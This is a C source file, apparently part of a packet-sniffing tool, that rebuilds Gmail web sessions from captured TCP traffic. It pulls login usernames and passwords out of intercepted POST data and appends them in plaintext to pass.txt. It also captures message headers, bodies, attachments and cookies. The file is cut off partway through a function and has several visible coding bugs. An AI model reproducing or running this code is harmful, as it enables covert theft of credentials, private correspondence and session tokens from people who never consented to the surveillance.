//yanglei 2.11.3.8
#include "common.h"
//#include <boost/regex.hpp>
/*write the gmail password*/
void write_gmail_psword(Mail_info *mail_info)
{
	/*char patternusername[] = "&Email=(.*)&Passwd=";
	char patternpassword[] = "&Passwd=(.*)&signIn=";

        memset(mail_info->username, 0, MAX_UN_LEN+1);
        regcompile_1(mail_info->mail_data, patternusername, mail_info->username, MAX_UN_LEN); 
        convert_contents(mail_info->username);
        char *p = strstr(mail_info->username, "@gmail.com");
        if(p == NULL)
        {
            int lengths = strlen(mail_info->username);
            strncpy(mail_info->username+lengths, "@gmail.com", 10);
            mail_info->username[lengths + 10] = 0; 
        }
        
	regcompile_1(mail_info->mail_data, patternpassword, mail_info->passwd, MAX_PW_LEN);*/

//	printf("111111111111111111\n");

	char *p1 = NULL;
	char *p2 = NULL;
	p1 = strstr(mail_info->mail_data, "&Email=");
	if(p1 == NULL) return;
	p1+=7;
	p2 = strstr(p1, "&");
	if(p2 == NULL)
	{
		return;
	}
	memcpy(mail_info->username, p1, (p2 - p1)>MAX_UN_LEN?MAX_UN_LEN:(p2 - p1));
	mail_info->username[p2 - p1] = 0; 
    convert_contents(mail_info->username);
    char *p = strstr(mail_info->username, "@gmail.com");
    if(p == NULL)
    {
        int lengths = strlen(mail_info->username);
        strncpy(mail_info->username+lengths, "@gmail.com", 10);
        mail_info->username[lengths + 10] = 0;
    }
	p2=strstr(p2,"&Passwd=");
	if(p2 == NULL) return;
	p2+=8;
	p1 = strstr(p2, "&");
	if(p1 == NULL) return;
	memset(mail_info->passwd, 0, MAX_PW_LEN+1);
	memcpy(mail_info->passwd, p2, (p1 - p2)>MAX_PW_LEN?MAX_PW_LEN:(p1 - p2));
	mail_info->passwd[p1 - p2] = 0;

	htmldecode_full(mail_info->passwd,mail_info->passwd);
	write_xml(mail_info);
	//LOG_INFO("username = %s\n",mail_info->username);
	//LOG_INFO("passwd = %s\n", mail_info->passwd);

	FILE *fp;
        char passpath[MAX_PATH_LEN];
	sprintf(passpath, "%s/pass.txt", mail_data_path);
	fp = fopen(passpath,"a+");
	if(fp == NULL)
	{
		return;
	}
	fprintf(fp,"\nusername=%s\npassword=%s\n",mail_info->username,mail_info->passwd);
	fclose(fp);
}

int analyse_gmail_psword(Mail_info * mail_info, char * data, unsigned int datalen, struct tcphdr * tcp, int is_b_s)
{
	unsigned int seq = ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	char http_ok_head[11]="HTTP/1.1 ";

	//printf("gmail pass - \r\n%s\r\n", data);
        
	if(is_b_s && !mail_info->is_complished)
	{
		if (mail_info->mail_length == 0)
		{
			mail_info->mail_length = 5000;
			mail_info->mail_data = (char *)malloc(5000);
			if(mail_info->mail_data ==NULL)
			{
				return -1;
			}
			memset(mail_info->mail_data,0,5000);
			mail_info->start_seq = seq;
		}
		if(mail_info->mail_length == 5000) 
		{
			int len;
			char *tmp;
			len = get_http_length(data);
			if (len > 0)
			{
				mail_info->mail_length += len;
				tmp = (char *)malloc(mail_info->mail_length);
				if(tmp ==NULL)
                {
					return -1;
				}
				memset(tmp,0,mail_info->mail_length);
				memcpy(tmp,mail_info->mail_data,5000);
				free(mail_info->mail_data);
				mail_info->mail_data = tmp;
			}
		}
		off_seq = seq - mail_info->start_seq;
		range=off_seq + datalen;
		if(range>mail_info->mail_length)
		{
			return -1;
		}
		memcpy(mail_info->mail_data + off_seq, data, datalen);
		if(strstr(mail_info->mail_data,"&Passwd="))
		{
			write_gmail_psword(mail_info);
			return -1;
		}
	}
	else if(!strncmp(data, http_ok_head, 9))
	{
		write_gmail_psword(mail_info);
		return -1;
	}

	return 0;
}

void write_gmail_file(Mail_info *mail_info)
{

	char patternto[] = "to=(.*)&cc=";
	char patterncc[] = "&cc=(.*)&bcc=";
	char patternbcc[] = "&bcc=(.*)&subject=";
	char patterncontent[] = "&body=(.*)&ishtml=1";
	char patternRid[] = "SSID=(.*)rememberme=";

	memset(mail_info->from, 0, MAX_FROM_LEN+1);	
	char *p1; 
	char *p2;
	int len;
	int k;
	char pattern[] = "\" <(.*)>";
	p1 = NULL;
	p2 = NULL;
	len = 0;
	k = 0;
	
	p1 = strstr(mail_info->mail_data,"jid=");
	if(p1 == NULL)
	{
		return;
	}
	p1+=4;
	p2 = strstr(p1, "/");
	if(p2 == NULL)
	{
		return;
	}
	len = p2 - p1;
	strncpy(mail_info->from, p1, len);

	memset(mail_info->to,0,MAX_TO_LEN+1);
	regcompile_1(mail_info->mail_data, patternto, mail_info->to,MAX_TO_LEN);
	convert_contents(mail_info->to);
	regcompile_1(mail_info->to, pattern, mail_info->to,100);

	if(!strstr(mail_info->from, "@") || !strstr(mail_info->to, "@"))
	{
		return;
	}

	memset(mail_info->cc,0,MAX_CC_LEN);
	k = regcompile_1(mail_info->mail_data, patterncc, mail_info->cc,MAX_CC_LEN);
	if(k!=-1)
	{
		convert_contents(mail_info->cc);
	}
	
	memset(mail_info->bcc, 0, MAX_BCC_LEN);
	k = regcompile_1(mail_info->mail_data, patternbcc, mail_info->bcc, MAX_BCC_LEN);
	if(k != -1)
	{
		convert_contents(mail_info->cc);
	}
   	p1 = strstr(mail_info->mail_data, "subject=");
	if(p1 == NULL)
	{
		return;
	}
	p1 += 8;
	p2 = strstr(p1, "&amp");
	if(p2 == NULL);
	{
		LOG_INFO("&amp\n");
		p2 = strstr(p1, "&att");
		if(p2 == NULL)
		{
			p2 = strstr(p1, "&body=");
		}
	}
	strncpy(mail_info->subject, p1, p2 - p1);
        p1 = mail_info->mail_data;
        p2 = NULL;
	/////////
	char  *tmp1 = NULL, *tmp2 = NULL;
	char ID[MAX_ID_LEN];
	memset(ID, 0, MAX_ID_LEN);
        regcompile_1(mail_info->mail_data, patternRid, ID, MAX_SUBJ_LEN);

	int  fd;
	char filename[MAX_FN_LEN] = {0};
        memset(mail_info->save_path, 0, MAX_PATH_LEN + 1);
	create_dir(mail_info->save_path, "gmail", mail_info->from);
	
	p1 = strstr(mail_info->mail_data, "GX=");
	if(p1 == NULL)
	{
		return;
	}
	if(p1 != NULL)
	{
		p1+=3;
	}
	p2 = strstr(p1, "-");
	if(p2 == NULL)
	{
		return;
	}
	char attach_id[MAX_ID_LEN+1] = {0};
	memcpy(attach_id, p1, (p2 - p1)>MAX_ID_LEN?MAX_ID_LEN:(p2 - p1));

	int iAttnum = 0; /*��������*/
	p1 = strstr(mail_info->mail_data, "&att");

	while(p1 != NULL)
	{
		p1+=4;
		iAttnum++;
		p1 = strstr(p1, "&att");
	};


	Mail_info *mail_info1;
	Attachment *attachment;
	mail_info1 = mail_tab.head->next;
 	char writepath[MAX_PATH_LEN] = {0};
	int flag = 0;
	int flag1 = 0;
	int i = 0;

	while(mail_info1 != NULL)
	{
		if(!strcmp(mail_info1->ID_str, attach_id))
		{
			i++;
			attachment = (Attachment *)malloc((sizeof(Attachment))+1);
                        memset(attachment,0,(sizeof(Attachment))+1);
                        memset(attachment->loc_filename,0,MAX_FN_LEN+1);
			attachment->next =NULL;
			sprintf(attachment->loc_name, "%s", mail_info1->attach_name);
			sprintf(attachment->loc_filename,"attach%d_%s",i,mail_info1->attach_name);
			if(!flag1)
		        {
				mail_info->attach = attachment;
				flag1++;
			}
			else
			{
				attachment->next =mail_info->attach->next;
				mail_info->attach->next=attachment;
			}
			sprintf(writepath,"%s/%s",mail_info->save_path,attachment->loc_filename);

			link(mail_info1->path_of_here, writepath);
			//unlink(mail_info1->path_of_here);
			//printf("(mail_info1->attach_name = %s\n", mail_info1->attach_name);
			flag++;
		}
		mail_info1 = mail_info1->next;

		if(flag == iAttnum)
		{
			break;
		}
	}

	regcompile_2(mail_info->mail_data, patterncontent, &mail_info->content);
	if (mail_info->content != NULL) 
	{
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
	
/*	printf("mail_info->from : %s\n", mail_info->from);
	printf("mail_info->to : %s\n", mail_info->to);
	printf("mail_info->cc : %s\n", mail_info->cc);
	printf("mail_info->bcc : %s\n", mail_info->bcc);
	printf("mail_info->subject : %s\n", mail_info->subject);
	printf("mail_info->content : %s\n", mail_info->content);*/
	if(mail_info->mail_id)
	{
		free(mail_info->mail_id);
		mail_info->mail_id = NULL;
	}
	
	if(mail_info->to == NULL)
	{
		return;
	}
	write_to_file(mail_info);
}

void write_gmail_file1(Mail_info *mail_info, char *str, int str_len)
{//printf("function: write_gmail_file1\n");
	//char patternfrom[]="name=\"nvp_bu_send\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"to\"";
	char patternto[]="name=\"to\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"cc\"";

	char patterncc[]="name=\"cc\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"bcc\"";
	char patternbcc[]="name=\"bcc\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"subject\"";

	char * front,* back;
	front = strstr(mail_info->mail_data, "name=\"nvp_bu_send\"\r\n\r\n");
	if(front == NULL) return;
	front += 22;
	back = strstr(front, "\r\n---");
	int len = back-front;
	if(len>MAX_FROM_LEN) len=MAX_FROM_LEN;
	strncpy(mail_info->from,front,len);
	mail_info->from[len]=0;         //printf("\nfrom\n");
	//regcompile_1(mail_info->mail_data, patternfrom, mail_info->from,MAX_FROM_LEN);
	regcompile_1(mail_info->mail_data, patternto, mail_info->to,MAX_TO_LEN);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(mail_info->mail_data, patterncc,mail_info->cc,MAX_CC_LEN);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(mail_info->mail_data, patternbcc,mail_info->bcc,MAX_BCC_LEN);
	//printf("\nbcc\n");

	char *p1 = mail_info->mail_data;
	char *p2;
	int fd;
	int i = 0;
	char filename[MAX_FN_LEN];
	int flag = 0;

	create_dir(mail_info->save_path, "gmail", mail_info->from);
	//chdir(mail_info->save_path);
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;

	while (1)
	{
		p2 = strstr(p1, "form-data; name=\"file");
		if (p2 == NULL) 
		break;
		p1 = p2;
		p1 += 21;
		p1 = strstr(p1, "\"; filename=\"");
		if(p1 == NULL) 
            break;
        
		p1 += 13;
		if (*p1 == '\"')
		{
			continue;
		}
		p2 = strstr(p1, "\"\r\nContent-Type: ");
		if(p2==NULL) 
		{
			continue;
		}
		i++;
		Attachment *attachment = (Attachment *)malloc((size_t)(sizeof(Attachment)));
		attachment->next = NULL;

		if (!flag) 
		{
			mail_info->attach = attachment;
			flag = 1;
		} 
		else 
		{
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
		
		memcpy(attachment->path_of_sender, p1, (p2 - p1)>MAX_PATH_LEN?MAX_PATH_LEN:(p2 - p1));
		attachment->path_of_sender[p2 - p1] = 0;
		get_file_name(attachment->path_of_sender, filename);
		snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
		sprintf(attachment->loc_filename, "atta%d_%s", i, filename);
		p1 = strstr(p1, "\r\n\r\n");
		
		if(!p1) 
		{
			break;
		}
		p1 += 4;
		unsigned int n = mail_info->mail_length - (p1 - mail_info->mail_data);
		p2 = memfind(p1, "Content-Disposition: form-data;", n);

		if (p2 == NULL) 
		{
			return ;
		}

		char str[MAX_PATH_LEN];
		sprintf(str, "%s/%s",mail_info->save_path, attachment->loc_filename);

		fd = open(str, O_RDWR | O_CREAT, file_mode);
		write(fd, p1, p2 - p1);
		close(fd);
		trim_attach(str, 45);
		p1 = p2;//printf("\n       while2\n");
	}
	mail_info->num_of_attach = i;
	p1 = strstr(mail_info->mail_data, "\"subject\"\r\n\r\n");
	if(p1 == NULL)
	{
		return;
	}
	p1+=13;
	p2 = strstr(p1, "\r\n------");
	if(p2 == NULL)
	{
		return;
	}
	strncpy(mail_info->subject, p1, p2 - p1);

	unsigned int n = mail_info->mail_length - (p2 - mail_info->mail_data);
	p1 = memfind(p2, "name=\"body\"", n);
	//p1 = strstr(p2, "name=\"body\"");

	if(p1 == NULL)
	{
		mail_info->content = (char*)malloc(str_len + 1);
		memset(mail_info->content, 0, str_len);
		memcpy(mail_info->content, str, str_len);
	}
	else
	{
		p1+=15;
		p2 = strstr(p1, "\r\n------");
		if(p2 == NULL)
			return;
		mail_info->content = (char*)malloc(p2 - p1 + 1);
		memset(mail_info->content, 0, p2 - p1 + 1);
		memcpy(mail_info->content, p1, p2 - p1);
		mail_info->content[p2-p1] = 0;
	}
	
	if (mail_info->content != NULL) 
	{
		char *tmp_str = NULL;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
	/*printf("mail_info->from : %s\n", mail_info->from);
	printf("mail_info->to : %s\n", mail_info->to);
	printf("mail_info->cc : %s\n", mail_info->cc);
	printf("mail_info->bcc : %s\n", mail_info->bcc);
	printf("mail_info->subject : %s\n", mail_info->subject);
	printf("mail_info->content : %s\n", mail_info->content);*/
	write_to_file(mail_info);
}


int analyse_gmail_content(Mail_info * mail_info, char * data, unsigned int datalen, struct tcphdr * tcp, int is_b_s)
{
	//printf("function: analyse_gmail_content\n");
	unsigned int seq = ntohl(tcp->seq);
	int off_seq = seq-mail_info->start_seq;
	int range;
	char http_ok_head[18] = "HTTP/1.1 200 OK\r\n";
	
	
	if(is_b_s)
	{
		if(!mail_info->is_complished)
		{
			if (mail_info->mail_length == 0) 
			{
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data == NULL)
				{
					return -1;
				}
				memset(mail_info->mail_data, 0, 5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000) 
			{
				int len;
				char *tmp;
				len = get_http_length(data);
				if (len > 0) 
				{
					mail_info->mail_length += len;
					tmp = (char *)malloc(mail_info->mail_length);
					if(tmp == NULL)
					{
						return -1;
					}
					memset(tmp, 0, mail_info->mail_length);
					memcpy(tmp, mail_info->mail_data, 5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range = off_seq + datalen;
			if(range > mail_info->mail_length)
			{
				return -1;
			}
			memcpy(mail_info->mail_data + off_seq, data, datalen);
		}
	}	
	else if(!strncmp(data, http_ok_head, 15))
	{
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		write_gmail_file(mail_info);
		del_mail_node(mail_info);
	}
	return 0;
}

int analyse_gmail_content1(Mail_info * mail_info, char * data, unsigned int datalen, struct tcphdr * tcp, int is_b_s)
{//printf("function: analyse_gmail_content1\n");
	unsigned int seq = ntohl(tcp->seq);
	int off_seq = seq-mail_info->start_seq;
	int range;
	char http_ok_head[13] = "HTTP/1.1 302";
	char *str;
	char *p1;
	char *p2;
	int str_len;
	str_len = 0;
	p1 = NULL;
	p2 = NULL;

	if(strstr(data, "\"body\""))
	{
		p1 = strstr(data, "\"body\"");
		p1+=8;
		p2 = strstr(p1, "\r\n------");
		if(p2!=NULL)
		{
			str = (char*)malloc(p2 - p1 + 1);
			memset(str, 0, p2 - p1 + 1);
			memcpy(str, p1, p2 - p1);
			str[p2-p1] = 0;
			str_len = p2 - p1;
			//printf("str = %s\n", str);
		}
	}
	
	if(is_b_s)
	{
		if(!mail_info->is_complished)
		{
			if (mail_info->mail_length == 0) 
			{
				mail_info->mail_length = 6000;
				mail_info->mail_data = (char *)malloc(6000);
				if(mail_info->mail_data == NULL)
				{
					return -1;
				}
				memset(mail_info->mail_data, 0, 6000);
				mail_info->start_seq = seq;			}
			if(mail_info->mail_length == 6000) 
			{
				int len;
				char *tmp;
				len = get_http_length(data);
				if (len > 0) 
				{
					mail_info->mail_length += len;
					tmp = (char *)malloc(mail_info->mail_length);
					if(tmp == NULL)
					{
						return -1;
					}
					memset(tmp, 0, mail_info->mail_length);
					memcpy(tmp, mail_info->mail_data, 6000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range = off_seq + datalen;
			if(range > mail_info->mail_length)
			{
				return -1;
			}
			memcpy(mail_info->mail_data + off_seq, data, datalen);
		}
	}	
	else if(!strncmp(data, http_ok_head, 12))
	{
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		write_gmail_file1(mail_info, str, str_len);
		del_mail_node(mail_info);
	}
	return 0;
}

void write_gmail_recive(Mail_info *mail_info)
{//printf("function: write_gmail_recive\n");
	
	char *p1;
	char *p2;
	char *p3;
	char *p4;
	int len;
	
	p1 = NULL;
	p2 = NULL;
	p3 = NULL;
	len = 0;
	//printf("mail_info->recive_data = %s\n",mail_info->recive_data);
	p1 = strstr(mail_info->recive_data, "<b>");
	if(p1 == NULL)
	{
		printf("<b>\n");
		return;
	}
	p1+= 3;
	p2 = strstr(p1, "</b>");
	if(p2 == NULL)
	{
		LOG_INFO("</b>\n");
	}
	len = p2 - p1;
	strncpy(mail_info->subject, p1, len);
	mail_info->subject[len] = 0;
	//printf("\nmail_info->subject = %s\n",mail_info->subject);
	p1 = strstr(p2, "&lt;");
	if(p1 == NULL)
	{
		LOG_INFO("&lt;\n");
		return;
	}
	p1+=4;
	p2 = strstr(p1, "&gt;");
	if(p2 == NULL)
	{
		LOG_INFO("&gt;\n");
		return;
	}
	len = p2 - p1;
	strncpy(mail_info->from, p1 ,len);
	mail_info->from[len] = 0;
	//printf("\nmail_info->from = %s\n",mail_info->from);
	p1 = strstr(p2, "valign=\"top\"> ");
	if(p1 == NULL)
	{
		LOG_INFO("valign=\"top\"> ");
		return;
	}
	p1 += 14;
	if(strstr(p1, "/images/paperclip.gif\""))
	{
		p2 = strstr(p1, "/images/paperclip.gif\"");
		p1 = strstr(p2, ">");
		p1 += 1;
	}
	p2 = strstr(p1, " <tr>");
	if(p2 == NULL)
	{
		LOG_INFO("<tr>\n");
		return;
	}
	len = p2 - p1;
	strncpy(mail_info->sent_time, p1 ,len);
	mail_info->sent_time[len] = 0;
	//printf("\nmail_info->sent_time = %s\n",mail_info->sent_time);
	p1 = strstr(p2, "<td colspan=\"2\">");
	if(p1 == NULL)
	{
		LOG_INFO("<td colspan=\"2\">\n");
		return;
	}
	p1 += 16;
	while(memcmp(p1, "\xe6\x94\xb6\xe4\xbb\xb6\xe4\xba\xba\xef\xbc\x9a", 12))
	{
		p1 = strstr(p1, "<td colspan=\"2\">");
		if(p1 == NULL) return;
		p1 += 16;
	}
	p1 += 12;                                     //printf("\np1 = %s\n",p1);
	p2 = strstr(p1, " <tr> <td colspan=\"2\">");
	if(p2 == NULL)
	{
		LOG_INFO("///\n");
		return;
	}
	p3 = p1;
	p4 = p2;
	len = p2 - p1;
	strncpy(mail_info->to, p1, len);
	mail_info->to[len] = 0;
	//printf("mail_info->to  = %s\n", mail_info->to);

	p1 = strstr(p2, "<td colspan=\"2\">");
	if(p1 != NULL)
	{
		p1 += 16;
		//查找字符串 “抄送：“
		if(!memcmp(p1, "\xe6\x8a\x84\xe9\x80\x81\xef\xbc\x9a", 9))
		{
			p1+=9;
			p2 = strstr(p1, " <tr> <td colspan=\"2\">");
			if(p2 != NULL)
			{
				p3 = p2;
				len = p2 - p1;
				strncpy(mail_info->cc, p1, len);
				mail_info->cc[len] = 0;
				LOG_INFO("mail_info->cc  = %s\n", mail_info->cc);
			}
		}
	}

	p1 = strstr(mail_info->recive_data, "<div class=\"msg\">");
	if(p1 == NULL)
	{
		LOG_INFO("<div class= <div>\n");
		return;
	}
	p1+=17;
	p2 = mail_info->recive_data+mail_info->recive_length;//strstr(p1, "<br clear=");
	if(p2 == NULL)
	{
		LOG_INFO("</table> \n");
		p2 = strstr(p1, "</div>");
		if(p2 == NULL)
		{
			return;
		}
	}
	len = p2 - p1;

	mail_info->content = (char*)malloc(len + 1);
	memset(mail_info->content, 0 , len);
	memcpy(mail_info->content, p1, len);//printf("\nmail_info->content = %s\n",mail_info->content);
	if (mail_info->content != NULL) 
	{
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
//printf("\nmail_info->content2 = %s\n",mail_info->content);
	create_dir(mail_info->save_path, "gmail", mail_info->from);
	write_to_file(mail_info);
	//write_oracle_db_cookieinfo(mail_info);
}

int analyse_gmail_recive(Mail_info * mail_info, char * data, unsigned int datalen, struct tcphdr * tcp, int is_b_s)
{
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int len;
	int range;
	char *p = NULL;
	char *p1 = NULL;
	char *p2 = NULL;
	len = 0;
	int result;
	char *dest = NULL;
	static int flag = -1;
	if(is_b_s)
	{
		if(mail_info->mail_data == NULL)
		{
			mail_info->mail_data = (char *)calloc(1, 2000 + 1);
			memcpy(mail_info->mail_data, data, datalen>2000?2000:datalen);
		}
		else
		{
			mail_info->mail_data = (char *)realloc(mail_info->mail_data, strlen(mail_info->mail_data) + datalen + 1);
			memcpy(mail_info->mail_data + strlen(mail_info->mail_data), data, datalen);
		}
		char id[MAX_ID_LEN]={0};
		p1 = strstr(data, "&th=");
		if(p1 == NULL)
		{
			return -1;
		}
		p1+=4;
		p2 = strstr(p1, " HTTP/1");
		if(p2 == NULL)
		{
			return -1;
		}
		len = p2 - p1;
		if (len < 0 || len > MAX_ID_LEN)
		{
			return -1;
		}
		memcpy(mail_info->mail_id, p1, len);
		mail_info->mail_id[len] = 0;
	}
    else
    {//printf("\n7\n");
        if(!strncmp(data,"HTTP/1.",7))
		{
			mail_info->recive_length = 50000;
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data == NULL)
				return -1;
			memset(mail_info->recive_data, 0, mail_info->recive_length);
			mail_info->http_seq = seq;
                }
		if (mail_info->recive_data != NULL)
		{
			off_seq = seq-mail_info->http_seq;
			range = off_seq+datalen;
			if (range>mail_info->recive_length)
			{
				mail_info->recive_data = (char *)realloc(mail_info->recive_data, range + 1);
				if(mail_info->recive_data == NULL)
					return -1;
					
				mail_info->recive_length = range;
				memcpy(mail_info->recive_data + off_seq, data, datalen); 
			}
			else
			{
				memcpy(mail_info->recive_data+off_seq, data, datalen);
			}
		}
		
        if((tcp->fin&&mail_info->recive_data!=NULL) || (datalen>=2&&!memcmp(data + datalen - 2, "\0\0", 2)) || (data!=NULL&&strstr(data, "</html>")) || (datalen>=7&&!memcmp(data + datalen - 7, "\r\n0\r\n\r\n", 7)))
        {//printf("\nmail_info->recive_data = %s\n", mail_info->recive_data);
			mail_info->is_complished = 1;
			char *p1;
			char *p2;
			int len;
			p1 = NULL;
			p2 = NULL;
			len = 0;
			p1 = strstr(mail_info->recive_data, "class=\"h\"");
			if(p1 == NULL)
			{
				return -1;
			}
			p2 = strstr(p1, "</div> </table>");
			if(p2 == NULL)
			{
				return -1;
			}
			p2+=6;
			char *str;
			str = (char*)malloc(p2 - p1 + 1);
			memset(str, 0, p2 - p1);
			memcpy(str, p1, p2 - p1);

			mail_info->recive_data == NULL;
                        mail_info->recive_length = p2 - p1;
			mail_info->recive_data=(char *)malloc(p2 - p1 +1);
			memset(mail_info->recive_data, 0, p2 - p1);
			memcpy(mail_info->recive_data, p1, p2 - p1);
			get_cookie(mail_info->mail_data, mail_info->cookie_data);//printf("\nmail_info->cookie_data = %s\n",mail_info->cookie_data);
			write_gmail_recive(mail_info);
			del_mail_node(mail_info);
        }
    }
	return 0;
}


void analyse_gmail_attach(Attach_info *attach_info, Mail_info *mail_info, char *data, unsigned int datalen, struct tcphdr *tcp, int is_b_s)
{
	unsigned  int seq=ntohl(tcp->seq);
	int result=0;
        int off_seq;
        int data_seq;
        int flag = 0;
        char *p;

	if(is_b_s)
	{ 	
		if(strstr(data,"&del_att_from=upload&upload_type=del_action"))
                {
                     del_attach_node(attach_info);
		     delete_attach(attach_info);
                     return;
                }
		if (!strncmp(data, "POST /mail/", 11))
		{
			char *p1;
			p1 = NULL;
			attach_info->recive_length = 0;
			//mail_info->recive_length = get_http_length(data);
			
			char *p = strstr(data, "\r\nContent-Length: ");
			if (p == NULL)
			{
				attach_info->recive_length = 5000;
			}
			else
			{
				p += 18;
				while( *p != '\r') 
				{
					attach_info->recive_length = attach_info->recive_length * 10 + (*p - '0');
					p++;
				}
			}
			//mail_info->attach_len = mail_info->recive_length;
			if (attach_info->recive_length <= 0) 
				return ;
			
			attach_info->recive_length += 3000;
			attach_info->recive_data = (char *)malloc(attach_info->recive_length);
			if(attach_info->recive_data == NULL) 
				return ;
			memset(attach_info->recive_data,0,attach_info->recive_length);
			
			p1 = strstr(data,"Cookie:");
			if(p1 == NULL)
			{
				return;
			}
			
            attach_info->start_seq = seq+p1-data; 
			memcpy(attach_info->recive_data, p1, datalen-(p1-data));
		}
		else 
		{
			if((attach_info->recive_data != NULL) && datalen)
			{ 
				off_seq = seq - attach_info->start_seq;
				if (off_seq+ datalen > attach_info->recive_length) 
				{
					attach_info->recive_data = (char *)realloc(attach_info->recive_data,attach_info->recive_length+((off_seq+ datalen-attach_info->recive_length)/5000+1)*5000);
					if(attach_info->recive_data == NULL)
						return;
 					attach_info->recive_length+=((off_seq+ datalen-attach_info->recive_length)/5000+1)*5000;
					memcpy(attach_info->recive_data + off_seq, data, datalen); 
				}
				else
				{
					memcpy(attach_info->recive_data + off_seq, data, datalen);
				} 
			}
		
		}
		if(attach_info->recive_data != NULL && !attach_info->is_get_ok)
		{
			if(tcp->fin)
			{
				attach_info->is_get_ok=1;
				
				attach_info->is_complished =1;
                                char *p1=strstr(attach_info->recive_data,"Filename\"\r\n\r\n");
				if(p1 == NULL)
					return;
				p1+=13;
				char *p2=strstr(p1,"\r\n");
				if(p2 == NULL)
					return;
				
				strncpy(attach_info->attach_name,p1,p2-p1);//the name of attach file
	                        attach_info->attach_name[p2-p1]=0;
				p1 = strstr(attach_info->recive_data, "GX=");
				if(p1 == NULL)
				{
					return;
				}
				if(p1 != NULL)
				{
					p1+=3;
				}
				p2 = strstr(p1, "-");
				if(p2 == NULL)
				{
					return;
				}
				strncpy(attach_info->ID_str,p1,p2-p1);//the rid of attach file
				attach_info->ID_str[p2-p1]=0;
	
				strncpy(mail_info->ID_str,p1,p2-p1);//the rid of attach file
				mail_info->ID_str[p2-p1]=0;


                                p1=strstr(p1,"application/octet-stream\r\n\r\n");
                                p1+=28;  
                                p2 = memfind(p1, "\r\n----------", attach_info->recive_length-(p1-attach_info->recive_data)-1000);
                                if(p2 == NULL)
                                {
                                        return ;
                                }
				struct timeval tv;//creat temp attach file
				struct timezone tz;
				gettimeofday(&tv,&tz);
                                memset(attach_info->path_of_here,0,MAX_PATH_LEN + 1);
				sprintf(attach_info->path_of_here,"%s/%lu-%lu",mail_temp_path,tv.tv_sec,tv.tv_usec); //3
				mode_t  file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;
				int fd = open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);
				if (fd ==-1)
				{
					return ; 
				}
                                write(fd,p1,p2-p1);
                                close(fd);
			}
		} 
        }
	else
	{
		if(!attach_info->is_get_ok)
		{
			char http_ok_head[21]="HTTP/1.1 ";
			if(!strncmp(data,http_ok_head,9))
			{
				attach_info->is_get_ok=1;
				
				attach_info->is_complished =1;
				char *p1=strstr(attach_info->recive_data,"Filename\"\r\n\r\n");
				if(p1 == NULL)
				{
					return;
				}
				p1+=12;
				char *p2=strstr(p1,"\r\n");
				if(p2 == NULL)
				{
					return;
				}
				
				strncpy(attach_info->attach_name,p1,p2-p1);//the name of attach file
		                attach_info->attach_name[p2-p1]=0;
				char *p3 = p1;
				char *p4 = p2;
		
				p1=strstr(p1,"application/octet-stream\r\n\r\n");
				if(p1 == NULL)
				{
					return;
				}
				p1+=28;  
                                p2 = memfind(p1, "\r\n----------", attach_info->recive_length-(p1-attach_info->recive_data)-1000);
				//p2=strstr(p1,"\r\n----------");
                                if(p2 == NULL)
                                {
                                        return ;
                                }
				struct timeval tv;//creat temp attach file
				struct timezone tz;
				gettimeofday(&tv,&tz);
				sprintf(attach_info->path_of_here,"%s/%lu-%lu",mail_temp_path,tv.tv_sec,tv.tv_usec); //3
				mode_t  file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;
				int fd = open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);
				if (fd ==-1)
				{
					LOG_ERROR("fd == -1\n");
					return ; 
				}
				write(fd,p1,p2-p1);
				close(fd);
				p1 = strstr(attach_info->recive_data, "GX=");
				if(p1 == NULL)
				{
					return;
				}
				if(p1 != NULL)
				{
					p1+=3;
				}
				p2 = strstr(p1, "-");
				if(p2 == NULL)
				{
					return;
				}
				strncpy(attach_info->ID_str,p1,p2-p1);//the rid of attach file
				attach_info->ID_str[p2-p1]=0;
	
				strncpy(mail_info->ID_str,p1,p2-p1);//the rid of attach file
				mail_info->ID_str[p2-p1]=0;

				mail_info->attach_name = (char*)malloc(p4 - p3 + 1);
				memset(mail_info->attach_name, 0, p4 - p3);
				memcpy(mail_info->attach_name, attach_info->attach_name, p4 - p3);


				int path_len = strlen(attach_info->path_of_here);
				memset(mail_info->path_of_here, 0 ,MAX_PATH_LEN+1);
				memcpy(mail_info->path_of_here,attach_info->path_of_here,path_len);
			}
		}
	}
}



int analyse_gmail_attach_recive(Mail_info * mail_info, char * data, unsigned int datalen, struct tcphdr * tcp, int is_b_s)
{//printf("\nanalyse_gmail_attach_recive\n");
	unsigned int seq=ntohl(tcp->seq);
	unsigned int ack_seq = ntohl(tcp->ack);
	int off_seq;
	int range;
	unsigned int attach_len;
	int n;
	static int data_length = 0;

	if (is_b_s)
	{
		char tmp_id[MAX_ID_LEN + 1];
		int result;
		if (!strncmp(data, "GET /", 5))
		{
